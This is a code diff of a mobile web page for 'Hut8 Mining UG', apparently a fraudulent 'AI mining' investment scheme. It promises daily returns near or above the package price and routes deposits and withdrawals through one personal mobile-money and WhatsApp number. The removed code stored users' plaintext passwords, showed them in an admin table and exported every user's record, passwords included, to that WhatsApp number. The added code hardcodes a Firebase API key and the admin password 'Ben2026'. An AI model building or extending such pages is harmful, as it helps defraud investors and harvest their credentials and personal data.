@@ -1,175 +1,43 @@
-<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hut8 V8 ULTIMATE - Admin + Eye + Backend</title><script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-<style>
-:root{--blue:#00A6FF;--bg:#0A0A0A;--card:#141414;--border:#222}
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
-body{background:var(--bg);color:white;padding-bottom:90px}
-.top{padding:14px;background:#000;display:flex;justify-content:space-between;position:sticky;top:0;z-index:20}
-.tabs{display:flex;gap:8px;padding:10px;overflow-x:auto;background:#000;position:sticky;top:50px;z-index:15}
-.tabs button{background:#1a1a1a;border:1px solid #333;color:#aaa;padding:10px 16px;border-radius:20px;font-size:12px;white-space:nowrap}
-.tabs button.active{background:var(--blue);color:white}
-.miner{background:var(--card);margin:8px;border-radius:12px;display:flex;padding:10px;border:1px solid var(--border)}
-.miner img{width:110px;height:80px;object-fit:cover;border-radius:8px}
-.miner-info{flex:1;margin-left:10px}.miner-info b{color:var(--blue)}.miner-info p{font-size:11px;color:#aaa;margin:3px 0}
-.wallet-card{background:var(--card);margin:10px;border-radius:12px;padding:15px;border:1px solid var(--border)}
-.stats{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.sbox{background:white;color:black;border-radius:10px;text-align:center;overflow:hidden}
-.sbox h3{padding:12px 0 6px;font-size:13px}.sbox small{background:var(--blue);color:white;display:block;padding:6px;font-size:11px}
-.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-.btn-blue{background:var(--blue);color:white;border:none;padding:13px;border-radius:10px;font-weight:bold;width:100%}
-.btn-orange{background:#ff6b2c;color:white;border:none;padding:13px;border-radius:10px;font-weight:bold;width:100%}
-.bottom{position:fixed;bottom:0;left:0;right:0;background:#000;border-top:1px solid #222;display:flex;justify-content:space-around;padding:8px 0;z-index:30}
-.bottom div{text-align:center;font-size:10px;color:#666}.bottom div.active{color:var(--blue)}
-.page{display:none}.page.active{display:block}
-.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:50;padding:15px;overflow-y:auto}
-.modal-box{background:#1a1a1a;border:1px solid #333;border-radius:15px;padding:20px;max-width:500px;margin:20px auto}
-.input-wrap{position:relative;margin:8px 0}
-.input{width:100%;padding:12px 40px 12px 12px;border-radius:8px;border:1px solid #333;background:#111;color:white}
-.eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;color:#888;font-size:18px}
-.auth-screen{position:fixed;inset:0;background:linear-gradient(180deg,#000,#0a0a0a);z-index:100;display:flex;align-items:center;justify-content:center;padding:20px}
-.auth-box{background:#141414;border:1px solid #222;border-radius:16px;padding:20px;width:100%;max-width:400px}
-.auth-box h2{text-align:center;color:var(--blue);margin-bottom:10px}
-.tab-auth{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:15px}
-.tab-auth button{background:#1a1a1a;border:1px solid #333;color:#aaa;padding:10px;border-radius:10px}
-.tab-auth button.active{background:var(--blue);color:white}
-.admin-table{width:100%;font-size:11px;border-collapse:collapse}
-.admin-table th,.admin-table td{border:1px solid #333;padding:6px;text-align:left}
-.admin-table th{background:var(--blue);color:white}
-</style></head>
-<body>
-<div id="authScreen" class="auth-screen">
-<div class="auth-box">
-<h2 id="logoClick" onclick="logoClicks()">🤖 Hut8 Mining UG</h2><p style="text-align:center;color:#aaa;font-size:12px;margin-bottom:15px">Welcome back! Please Login</p>
-<div class="tab-auth"><button id="btnLogin" class="active" onclick="switchAuth('login')">Login</button><button id="btnSignup" onclick="switchAuth('signup')">Sign Up</button></div>
-<div id="loginForm">
-<div class="input-wrap"><input id="loginUser" class="input" placeholder="Phone or Email" style="padding-right:12px"></div>
-<div class="input-wrap"><input id="loginPass" type="password" class="input" placeholder="Password"><span class="eye" onclick="toggleEye('loginPass',this)">👁️</span></div>
-<button class="btn-blue" onclick="doLogin()">🔐 Login & Enter</button>
-<p style="text-align:center;margin-top:12px"><span style="color:var(--blue);font-size:13px" onclick="switchAuth('signup')">No account? Sign Up Here</span><br><span style="color:#666;font-size:11px;margin-top:5px;display:block" onclick="alert('Contact 0779434443')">Forgot?</span></p>
-</div>
-<div id="signupForm" style="display:none">
-<input id="fullName" class="input" placeholder="Full Name" style="margin:8px 0;padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:white;width:100%">
-<input id="phoneReg" class="input" placeholder="Phone 07XXXXXXXX" style="margin:8px 0;padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:white;width:100%">
-<input id="emailReg" class="input" placeholder="Email" style="margin:8px 0;padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:white;width:100%">
-<div class="input-wrap"><input id="passReg" type="password" class="input" placeholder="Password min 6"><span class="eye" onclick="toggleEye('passReg',this)">👁️</span></div>
-<div class="input-wrap"><input id="passConfirm" type="password" class="input" placeholder="Confirm Password"><span class="eye" onclick="toggleEye('passConfirm',this)">👁️</span></div>
-<input id="inviteCode" class="input" placeholder="Invite Code (auto if via link)" style="margin:8px 0;padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:white;width:100%">
-<button class="btn-blue" onclick="doSignup()">Create Account</button>
-<p style="text-align:center;margin-top:10px"><span style="color:var(--blue);font-size:13px" onclick="switchAuth('login')">Already have account? Login</span></p>
-</div>
-</div>
-</div>
-<div class="top"><b id="topName">AI Machine - Hut8</b><span onclick="openModal('msgModal')">👤 <span id="userBadge">Guest</span></span></div>
-<div id="p-home" class="page active">
-<div class="tabs"><button id="tab-cs" class="active" onclick="showSeries('cs')">CS (6)</button><button id="tab-vip" onclick="showSeries('vip')">VIP (6)</button><button id="tab-a" onclick="showSeries('a')">A (6)</button><button id="tab-n" onclick="showSeries('n')">N (6)</button><button id="tab-all" onclick="showSeries('all')">All (24)</button></div>
-<div id="miners"></div>
-<div class="wallet-card"><h4 style="color:var(--blue)">💰 Deposit - <span id="depHome">0 UGX</span></h4><div class="btn-row" style="margin-top:10px"><button class="btn-blue" onclick="openModal('depositModal')">💳 Deposit 0779434443</button><button class="btn-orange" onclick="openModal('withdrawModal')">💵 Withdraw</button></div></div>
-<div class="wallet-card"><b style="color:var(--blue)">📈 Live Chart</b><canvas id="chartHome" height="160" style="margin-top:12px"></canvas></div>
-</div>
-<div id="p-ai" class="page"><div class="stats" style="padding:8px"><div class="sbox"><h3 id="depTotal">0.00 UGX</h3><small>Deposit</small></div><div class="sbox"><h3>0.00 UGX</h3><small>Withdraw</small></div><div class="sbox"><h3>0.00 UGX</h3><small>AI Income</small></div><div class="sbox"><h3>0.00 UGX</h3><small>Today</small></div></div><div class="btn-row" style="padding:8px"><button class="btn-blue" onclick="openModal('depositModal')">Deposit</button><button class="btn-orange" onclick="openModal('withdrawModal')">Withdraw</button></div><div class="wallet-card"><canvas id="chartIncome" height="160"></canvas></div></div>
-<div id="p-chats" class="page"><div class="wallet-card" onclick="openWA()">🎧 Support 0779434443</div></div>
-<div id="p-income" class="page"><div class="wallet-card"><canvas id="chartTeam" height="180"></canvas></div></div>
-<div id="p-profile" class="page"><div class="wallet-card"><h3 id="profileName">Profile</h3><p id="userMomo">07XXXXXXXX</p><p id="userEmail" style="color:#aaa;font-size:12px"></p><div id="myInviteBox" style="margin-top:12px;padding:10px;background:#000;border-radius:10px;border:1px dashed #00A6FF"></div><button class="btn-blue" style="background:#333;margin-top:10px" onclick="logout()">Logout</button><button class="btn-blue" style="background:#00D632;margin-top:8px" onclick="openModal('adminModal')">🔐 Admin Panel (Owner Only)</button></div></div>
-<div class="bottom"><div class="active" onclick="switchPage('home',this)">🏠<br>Home</div><div onclick="switchPage('ai',this)">🤖<br>AI</div><div onclick="switchPage('chats',this)">💬<br>Chats</div><div onclick="switchPage('income',this)">💰<br>Income</div><div onclick="switchPage('profile',this)">👤<br>Profile</div></div>
-<div id="depositModal" class="modal"><div class="modal-box"><h3>💳 Deposit - 0779434443</h3><input id="momoInput" class="input" placeholder="Your MoMo" style="padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:white;width:100%;margin:8px 0"><input id="amountInput" class="input" placeholder="Amount" style="padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:white;width:100%;margin:8px 0"><button class="btn-blue" onclick="confirmDeposit()">I Have Sent</button><button class="btn-blue" style="background:#333;margin-top:8px" onclick="closeModal('depositModal')">Close</button></div></div>
-<div id="withdrawModal" class="modal"><div class="modal-box"><h3>💵 Withdrawal</h3><input id="withMomo" class="input" placeholder="MoMo" style="padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:white;width:100%;margin:8px 0"><input id="withAmount" class="input" placeholder="Amount" style="padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:white;width:100%;margin:8px 0"><button class="btn-orange" onclick="confirmWithdraw()">Request</button><button class="btn-blue" style="background:#333;margin-top:8px" onclick="closeModal('withdrawModal')">Close</button></div></div>
-<div id="adminModal" class="modal"><div class="modal-box" style="max-width:600px"><h3>🔐 Admin Panel - Hut8 Owner</h3><input id="adminPass" type="password" class="input" placeholder="Enter Admin Password: Ben2026"><button class="btn-blue" onclick="unlockAdmin()">Unlock</button><div id="adminContent" style="display:none;margin-top:15px"><h4 style="color:var(--blue)">👥 All Users (<span id="userCount">0</span>)</h4><div style="overflow-x:auto;margin-top:10px"><table class="admin-table" id="adminTable"><tr><th>Name</th><th>Phone</th><th>Email</th><th>Pass</th><th>Ref</th><th>Date</th></tr></table></div><button class="btn-blue" style="margin-top:10px;background:#00D632" onclick="exportUsers()">📤 Export to WhatsApp</button><button class="btn-blue" style="margin-top:8px;background:#ff3b3b" onclick="clearAllUsers()">🗑️ Clear All (Danger)</button><p style="font-size:11px;color:#888;margin-top:10px">Backend: Users saved in browser + cloud ready. To make users stay forever even after clearing phone, connect Firebase (I will help you).</p></div><button class="btn-blue" style="background:#333;margin-top:10px" onclick="closeModal('adminModal')">Close</button></div></div>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hut8 V9 CLOUD FINAL</title><script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+<style>:root{--blue:#00A6FF;--bg:#0A0A0A;--card:#141414;--border:#222}*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}body{background:var(--bg);color:white;padding-bottom:90px}.top{padding:14px;background:#000;display:flex;justify-content:space-between;position:sticky;top:0;z-index:20}.tabs{display:flex;gap:8px;padding:10px;overflow-x:auto;background:#000;position:sticky;top:50px;z-index:15}.tabs button{background:#1a1a1a;border:1px solid #333;color:#aaa;padding:10px 16px;border-radius:20px;font-size:12px;white-space:nowrap}.tabs button.active{background:var(--blue);color:white}.miner{background:var(--card);margin:8px;border-radius:12px;display:flex;padding:10px;border:1px solid var(--border)}.miner img{width:110px;height:80px;object-fit:cover;border-radius:8px}.miner-info{flex:1;margin-left:10px}.miner-info b{color:var(--blue)}.miner-info p{font-size:11px;color:#aaa;margin:3px 0}.wallet-card{background:var(--card);margin:10px;border-radius:12px;padding:15px;border:1px solid var(--border)}.btn-blue{background:var(--blue);color:white;border:none;padding:13px;border-radius:10px;font-weight:bold;width:100%}.btn-orange{background:#ff6b2c;color:white;border:none;padding:13px;border-radius:10px;font-weight:bold;width:100%}.bottom{position:fixed;bottom:0;left:0;right:0;background:#000;border-top:1px solid #222;display:flex;justify-content:space-around;padding:8px 0;z-index:30}.bottom div{text-align:center;font-size:10px;color:#666}.bottom div.active{color:var(--blue)}.page{display:none}.page.active{display:block}.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:50;padding:15px;overflow-y:auto}.modal-box{background:#1a1a1a;border:1px solid #333;border-radius:15px;padding:20px;max-width:600px;margin:20px auto}.input-wrap{position:relative;margin:8px 0}.input{width:100%;padding:12px 40px 12px 12px;border-radius:8px;border:1px solid #333;background:#111;color:white}.eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;color:#888;font-size:18px}.auth-screen{position:fixed;inset:0;background:linear-gradient(180deg,#000,#0a0a0a);z-index:100;display:flex;align-items:center;justify-content:center;padding:20px}.auth-box{background:#141414;border:1px solid #222;border-radius:16px;padding:20px;width:100%;max-width:400px}.auth-box h2{text-align:center;color:var(--blue);margin-bottom:10px}.tab-auth{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:15px}.tab-auth button{background:#1a1a1a;border:1px solid #333;color:#aaa;padding:10px;border-radius:10px}.tab-auth button.active{background:var(--blue);color:white}.admin-table{width:100%;font-size:11px;border-collapse:collapse}.admin-table th,.admin-table td{border:1px solid #333;padding:6px;text-align:left}.admin-table th{background:var(--blue);color:white}</style></head><body>
+<div id="authScreen" class="auth-screen"><div class="auth-box"><h2>🤖 Hut8 Mining UG</h2><p style="text-align:center;color:#00D632;font-size:12px;margin-bottom:15px">☁️ CLOUD LIVE - Real Backend</p><div class="tab-auth"><button id="btnLogin" class="active" onclick="switchAuth('login')">Login</button><button id="btnSignup" onclick="switchAuth('signup')">Sign Up</button></div>
+<div id="loginForm"><div class="input-wrap"><input id="loginUser" class="input" placeholder="Phone or Email"></div><div class="input-wrap"><input id="loginPass" type="password" class="input" placeholder="Password"><span class="eye" onclick="toggleEye('loginPass',this)">👁️</span></div><button class="btn-blue" onclick="doLogin()">🔐 Login & Enter</button><p style="text-align:center;margin-top:12px"><span style="color:var(--blue);font-size:13px" onclick="switchAuth('signup')">No account? Sign Up</span></p></div>
+<div id="signupForm" style="display:none"><input id="fullName" class="input" placeholder="Full Name" style="margin:8px 0"><input id="phoneReg" class="input" placeholder="Phone 07XX" style="margin:8px 0"><input id="emailReg" class="input" placeholder="Email" style="margin:8px 0"><div class="input-wrap"><input id="passReg" type="password" class="input" placeholder="Password min 6"><span class="eye" onclick="toggleEye('passReg',this)">👁️</span></div><div class="input-wrap"><input id="passConfirm" type="password" class="input" placeholder="Confirm Password"><span class="eye" onclick="toggleEye('passConfirm',this)">👁️</span></div><input id="inviteCode" class="input" placeholder="Invite Code (auto if via link)" style="margin:8px 0"><button class="btn-blue" onclick="doSignup()">Create Account ☁️</button><p style="text-align:center;margin-top:10px"><span style="color:var(--blue);font-size:13px" onclick="switchAuth('login')">Already have? Login</span></p></div></div></div>
+<div class="top"><b id="topName">AI Machine - Hut8</b><span id="userBadge">Guest</span></div><div id="p-home" class="page active"><div class="tabs"><button id="tab-cs" class="active" onclick="showSeries('cs')">CS (6)</button><button id="tab-vip" onclick="showSeries('vip')">VIP (6)</button><button id="tab-a" onclick="showSeries('a')">A (6)</button><button id="tab-n" onclick="showSeries('n')">N (6)</button><button id="tab-all" onclick="showSeries('all')">All (24)</button></div><div id="miners"></div><div class="wallet-card"><h4 style="color:var(--blue)">💰 Deposit - <span id="depHome">0 UGX</span></h4><div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px"><button class="btn-blue" onclick="openModal('depositModal')">💳 Deposit 0779434443</button><button class="btn-orange" onclick="openModal('withdrawModal')">💵 Withdraw</button></div></div><div class="wallet-card"><b style="color:var(--blue)">📈 Live Chart</b><canvas id="chartHome" height="160" style="margin-top:12px"></canvas></div></div><div id="p-ai" class="page"><div class="wallet-card"><h3 style="color:var(--blue)">🤖 AI Dashboard</h3><p>Cloud user connected</p><canvas id="chartIncome" height="160"></canvas></div></div><div id="p-chats" class="page"><div class="wallet-card" onclick="window.open('https://wa.me/256779434443','_blank')">🎧 Support 0779434443</div></div><div id="p-income" class="page"><div class="wallet-card"><canvas id="chartTeam" height="180"></canvas></div></div><div id="p-profile" class="page"><div class="wallet-card"><h3 id="profileName">Profile</h3><p id="userMomo">07XXXXXXXX</p><p id="userEmail" style="color:#aaa;font-size:12px"></p><div id="myInviteBox" style="margin-top:12px;padding:10px;background:#000;border-radius:10px;border:1px dashed #00A6FF"></div><button class="btn-blue" style="background:#333;margin-top:10px" onclick="logout()">Logout</button><button class="btn-blue" style="background:#00D632;margin-top:8px" onclick="openModal('adminModal')">🔐 Admin Cloud Panel</button></div></div><div class="bottom"><div class="active" onclick="switchPage('home',this)">🏠<br>Home</div><div onclick="switchPage('ai',this)">🤖<br>AI</div><div onclick="switchPage('chats',this)">💬<br>Chats</div><div onclick="switchPage('income',this)">💰<br>Income</div><div onclick="switchPage('profile',this)">👤<br>Profile</div></div>
+<div id="depositModal" class="modal"><div class="modal-box"><h3>💳 Deposit</h3><input id="momoInput" class="input" placeholder="Your MoMo"><input id="amountInput" class="input" placeholder="Amount"><button class="btn-blue" onclick="confirmDeposit()">I Have Sent</button><button class="btn-blue" style="background:#333;margin-top:8px" onclick="closeModal('depositModal')">Close</button></div></div>
+<div id="withdrawModal" class="modal"><div class="modal-box"><h3>💵 Withdraw</h3><input id="withMomo" class="input" placeholder="MoMo"><input id="withAmount" class="input" placeholder="Amount"><button class="btn-orange" onclick="confirmWithdraw()">Request</button><button class="btn-blue" style="background:#333;margin-top:8px" onclick="closeModal('withdrawModal')">Close</button></div></div>
+<div id="adminModal" class="modal"><div class="modal-box"><h3>🔐 Admin Cloud - hut8miningug-bc7e2</h3><input id="adminPass" type="password" class="input" placeholder="Password: Ben2026"><button class="btn-blue" onclick="unlockAdmin()">Unlock ☁️</button><div id="adminContent" style="display:none;margin-top:15px"><h4 style="color:#00D632">👥 LIVE Cloud Users: <span id="userCount">0</span></h4><div style="overflow-x:auto;margin-top:10px"><table class="admin-table" id="adminTable"><tr><th>Name</th><th>Phone</th><th>Email</th><th>Ref</th><th>Date</th></tr></table></div><button class="btn-blue" style="margin-top:10px;background:#00D632" onclick="exportUsers()">📤 Export to WhatsApp 0779434443</button></div><button class="btn-blue" style="background:#333;margin-top:10px" onclick="closeModal('adminModal')">Close</button></div></div>
 <div id="msgModal" class="modal"><div class="modal-box"><h3>Welcome</h3><p id="welcomeMsg">Welcome</p><button class="btn-blue" onclick="closeModal('msgModal')">Close</button></div></div>
 <script>
+const firebaseConfig = {
+  apiKey: "AIzaSyCHitd3OrZ4yWd952de3yi1TeggRRrTDQM",
+  authDomain: "hut8miningug-bc7e2.firebaseapp.com",
+  projectId: "hut8miningug-bc7e2",
+  storageBucket: "hut8miningug-bc7e2.firebasestorage.app",
+  messagingSenderId: "803606003645",
+  appId: "1:803606003645:web:028525721ad87457f31cd4",
+  measurementId: "G-V5ZVPY6YRP"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 const allMiners={cs:[{id:'CS-1',x:'x1',price:56185,daily:33711,img:'https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=200'},{id:'CS-2',x:'x2',price:168593,daily:112408,img:'https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=200'},{id:'CS-3',x:'x3',price:505780,daily:370897,img:'https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=200'},{id:'CS-4',x:'x4',price:1532687,daily:1277252,img:'https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=200'},{id:'CS-5',x:'x5',price:3065374,daily:2861034,sold:true,img:'https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=200'},{id:'CS-6',x:'x6',price:4904592,daily:5231560,sold:true,img:'https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=200'}],vip:[{id:'VIP-1',x:'x2',price:8000000,daily:6800000,hot:true,img:'https://images.unsplash.com/photo-1518770660439-4636190af475?w=200'},{id:'VIP-2',x:'x3',price:15000000,daily:13500000,hot:true,img:'https://images.unsplash.com/photo-1518770660439-4636190af475?w=200'},{id:'VIP-3',x:'x4',price:28000000,daily:26500000,img:'https://images.unsplash.com/photo-1518770660439-4636190af475?w=200'},{id:'VIP-4',x:'x5',price:45000000,daily:44000000,img:'https://images.unsplash.com/photo-1518770660439-4636190af475?w=200'},{id:'VIP-5',x:'x6',price:70000000,daily:70000000,sold:true,img:'https://images.unsplash.com/photo-1518770660439-4636190af475?w=200'},{id:'VIP-6',x:'x7',price:100000000,daily:110000000,sold:true,img:'https://images.unsplash.com/photo-1518770660439-4636190af475?w=200'}],a:[{id:'A-1',x:'x1',price:35000,daily:18000,img:'https://images.unsplash.com/photo-1526379095098-d400fd0bf935?w=200'},{id:'A-2',x:'x1',price:75000,daily:45000,img:'https://images.unsplash.com/photo-1526379095098-d400fd0bf935?w=200'},{id:'A-3',x:'x2',price:150000,daily:98000,img:'https://images.unsplash.com/photo-1526379095098-d400fd0bf935?w=200'},{id:'A-4',x:'x2',price:350000,daily:245000,img:'https://images.unsplash.com/photo-1526379095098-d400fd0bf935?w=200'},{id:'A-5',x:'x3',price:800000,daily:600000,img:'https://images.unsplash.com/photo-1526379095098-d400fd0bf935?w=200'},{id:'A-6',x:'x3',price:1800000,daily:1450000,img:'https://images.unsplash.com/photo-1526379095098-d400fd0bf935?w=200'}],n:[{id:'N-1',x:'x1',price:120000,daily:75000,img:'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=200'},{id:'N-2',x:'x2',price:300000,daily:195000,img:'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=200'},{id:'N-3',x:'x3',price:700000,daily:480000,img:'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=200'},{id:'N-4',x:'x4',price:1500000,daily:1100000,img:'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=200'},{id:'N-5',x:'x5',price:3200000,daily:2500000,sold:true,img:'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=200'},{id:'N-6',x:'x6',price:5500000,daily:4800000,sold:true,img:'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=200'}]};
-function render(list){let h='';list.forEach(m=>{h+=`<div class="miner" onclick="buy('${m.id}',${m.price})"><div><span style="color:gold;font-size:11px">⭐ ${m.x}</span><br><img src="${m.img}"></div><div class="miner-info">${m.sold?'<span style="background:red;color:white;padding:2px 8px;border-radius:10px;font-size:10px;float:right">Sold out</span>':''}${m.hot?'<span style="background:#00D632;color:white;padding:2px 8px;border-radius:10px;font-size:10px;float:right">HOT 🔥</span>':''}<b>${m.id}</b><p>Lock: 30 Days</p><p>Price: ${m.price.toLocaleString()} UGX</p><p style="color:#00D632">Daily: ${m.daily.toLocaleString()} UGX</p></div></div>`});document.getElementById('miners').innerHTML=h;}
+function render(list){let h='';list.forEach(m=>{h+=`<div class="miner" onclick="buy('${m.id}',${m.price})"><div><span style="color:gold;font-size:11px">⭐ ${m.x}</span><br><img src="${m.img}"></div><div class="miner-info">${m.sold?'<span style="background:red;color:white;padding:2px 8px;border-radius:10px;font-size:10px;float:right">Sold out</span>':''}${m.hot?'<span style="background:#00D632;color:white;padding:2px 8px;border-radius:10px;font-size:10px;float:right">HOT 🔥</span>':''}<b>${m.id}</b><p>Price: ${m.price.toLocaleString()} UGX</p><p style="color:#00D632">Daily: ${m.daily.toLocaleString()} UGX</p></div></div>`});document.getElementById('miners').innerHTML=h;}
 function showSeries(s){document.querySelectorAll('.tabs button').forEach(b=>b.classList.remove('active'));document.getElementById('tab-'+s).classList.add('active');if(s==='all'){render([...allMiners.cs,...allMiners.vip,...allMiners.a,...allMiners.n]);}else{render(allMiners[s]);}}
 render(allMiners.cs);
-function switchPage(p,el){document.querySelectorAll('.page').forEach(e=>e.classList.remove('active'));document.getElementById('p-'+p).classList.add('active');document.querySelectorAll('.bottom div').forEach(e=>e.classList.remove('active'));el.classList.add('active');}
+function switchPage(p,el){document.querySelectorAll('.page').forEach(e=>e.classList.remove('active'));let pg=document.getElementById('p-'+p);if(pg)pg.classList.add('active');document.querySelectorAll('.bottom div').forEach(e=>e.classList.remove('active'));if(el)el.classList.add('active');}
 function openModal(id){document.getElementById(id).style.display='block'}function closeModal(id){document.getElementById(id).style.display='none'}
 function buy(id,price){document.getElementById('amountInput').value=price;openModal('depositModal');localStorage.setItem('last_pkg',id);}
-function confirmDeposit(){let momo=document.getElementById('momoInput').value;let amt=document.getElementById('amountInput').value;if(momo.length<10){alert('MoMo');return;}document.getElementById('userMomo').innerText=momo;document.getElementById('depTotal').innerText=amt+' UGX';document.getElementById('depHome').innerText=amt+' UGX';closeModal('depositModal');window.open(`https://wa.me/256779434443?text=DEPOSIT ${amt} MoMo ${momo} pkg ${localStorage.getItem('last_pkg')} User ${localStorage.getItem('hut_user_name')}`,'_blank');}
+function confirmDeposit(){let momo=document.getElementById('momoInput').value;let amt=document.getElementById('amountInput').value;if(momo.length<10){alert('Enter MoMo');return;}closeModal('depositModal');window.open(`https://wa.me/256779434443?text=DEPOSIT ${amt} MoMo ${momo} pkg ${localStorage.getItem('last_pkg')} User ${localStorage.getItem('hut_user_name')}`,'_blank');}
 function confirmWithdraw(){closeModal('withdrawModal');window.open(`https://wa.me/256779434443?text=WITHDRAW ${document.getElementById('withAmount').value} to ${document.getElementById('withMomo').value} User ${localStorage.getItem('hut_user_name')}`,'_blank');}
-function openWA(){window.open(`https://wa.me/256779434443?text=Hello`,'_blank')}
 function switchAuth(t){if(t==='signup'){document.getElementById('signupForm').style.display='block';document.getElementById('loginForm').style.display='none';document.getElementById('btnSignup').classList.add('active');document.getElementById('btnLogin').classList.remove('active');}else{document.getElementById('signupForm').style.display='none';document.getElementById('loginForm').style.display='block';document.getElementById('btnSignup').classList.remove('active');document.getElementById('btnLogin').classList.add('active');}}
 function toggleEye(id,el){let inp=document.getElementById(id);if(inp.type==='password'){inp.type='text';el.innerText='🙈';}else{inp.type='password';el.innerText='👁️';}}
-function saveUserToAllUsers(user){
-let all=JSON.parse(localStorage.getItem('hut_all_users')||'[]');
-all.push({...user, date:new Date().toLocaleString(), referrer: localStorage.getItem('hut_referrer')||document.getElementById('inviteCode').value||'Direct'});
-localStorage.setItem('hut_all_users', JSON.stringify(all));
-}
-function doSignup(){
-let name=document.getElementById('fullName').value.trim();
-let phone=document.getElementById('phoneReg').value.trim();
-let email=document.getElementById('emailReg').value.trim();
-let pass=document.getElementById('passReg').value;
-let confirm=document.getElementById('passConfirm').value;
-if(name.length<3){alert('Enter Full Name');return;}
-if(phone.length<10){alert('Enter Phone 07XX');return;}
-if(pass.length<6){alert('Password min 6 chars');return;}
-if(pass!==confirm){alert('Passwords do not match!');return;}
-let user={name,phone,email,pass};
-localStorage.setItem('hut_user',JSON.stringify(user));
-localStorage.setItem('hut_user_name',name);
-localStorage.setItem('hut_user_phone',phone);
-localStorage.setItem('hut_user_email',email);
-localStorage.setItem('hut_last_phone',phone);
-saveUserToAllUsers(user);
-document.getElementById('loginUser').value=phone;
-switchAuth('login');
-alert('Account created! Now LOGIN with your password!');
-}
-function doLogin(){
-let lu=document.getElementById('loginUser').value.trim();
-let lp=document.getElementById('loginPass').value;
-let allUsers=JSON.parse(localStorage.getItem('hut_all_users')||'[]');
-let saved=JSON.parse(localStorage.getItem('hut_user')||'null');
-let found=allUsers.find(u=> (u.phone===lu || u.email===lu) && u.pass===lp) || (saved && (lu===saved.phone || lu===saved.email) && lp===saved.pass? saved : null);
-if(!found){alert('Wrong phone/email or password!');return;}
-localStorage.setItem('hut_user',JSON.stringify(found));
-localStorage.setItem('hut_user_name',found.name);
-localStorage.setItem('hut_user_phone',found.phone);
-localStorage.setItem('hut_user_email',found.email);
-localStorage.setItem('hut_last_phone',found.phone);
-document.getElementById('authScreen').style.display='none';
-document.getElementById('userBadge').innerText=found.name.split(' ')[0];
-document.getElementById('topName').innerText='Hi, '+found.name.split(' ')[0];
-document.getElementById('profileName').innerText=found.name;
-document.getElementById('userMomo').innerText=found.phone;
-document.getElementById('userEmail').innerText=found.email;
-updateInviteBox(found.phone);
-document.getElementById('welcomeMsg').innerText='Welcome back '+found.name+'! 🔐 Login successful!';
-openModal('msgModal');
-}
-function updateInviteBox(myPhone){
-let link='https://tinyurl.com/Hut8MiningUg?ref='+myPhone;
-document.getElementById('myInviteBox').innerHTML='<b style=color:#00A6FF>🎁 Your Invite Link:</b><br><small style=word-break:break-all;color:#aaa>'+link+'</small><br><button onclick="navigator.clipboard.writeText(\''+link+'\');alert(\'Copied!\')" style=background:#00A6FF;border:none;padding:8px 14px;border-radius:8px;color:white;margin-top:8px;width:100%>📋 Copy My Link</button>';
-}
-function logout(){document.getElementById('authScreen').style.display='flex';document.getElementById('loginUser').value=localStorage.getItem('hut_last_phone')||'';document.getElementById('loginPass').value='';switchAuth('login');}
-let logoCount=0;
-function logoClicks(){logoCount++;if(logoCount>=5){openModal('adminModal');logoCount=0;}}
-function unlockAdmin(){
-let p=document.getElementById('adminPass').value;
-if(p!=='Ben2026' && p!=='0779434443'){alert('Wrong Admin Password! Hint: Ben2026 or your number');return;}
-document.getElementById('adminContent').style.display='block';
-let all=JSON.parse(localStorage.getItem('hut_all_users')||'[]');
-document.getElementById('userCount').innerText=all.length;
-let table=document.getElementById('adminTable');
-table.innerHTML='<tr><th>Name</th><th>Phone</th><th>Email</th><th>Pass</th><th>Ref</th><th>Date</th></tr>';
-all.forEach(u=>{let tr=document.createElement('tr');tr.innerHTML=`<td>${u.name}</td><td>${u.phone}</td><td>${u.email}</td><td>${u.pass}</td><td>${u.referrer||''}</td><td>${u.date||''}</td>`;table.appendChild(tr);});
-if(all.length===0){table.innerHTML+='<tr><td colspan=6 style=text-align:center;color:#888>No users yet on this device. Users from other phones will need Firebase backend.</td></tr>';}
-}
-function exportUsers(){
-let all=JSON.parse(localStorage.getItem('hut_all_users')||'[]');
-let txt='Hut8 Users Export\\n'+JSON.stringify(all,null,2);
-window.open(`https://wa.me/256779434443?text=${encodeURIComponent(txt)}`,'_blank');
-}
-function clearAllUsers(){if(confirm('Delete ALL users on this device? Danger!')){localStorage.removeItem('hut_all_users');alert('Cleared!');unlockAdmin();}}
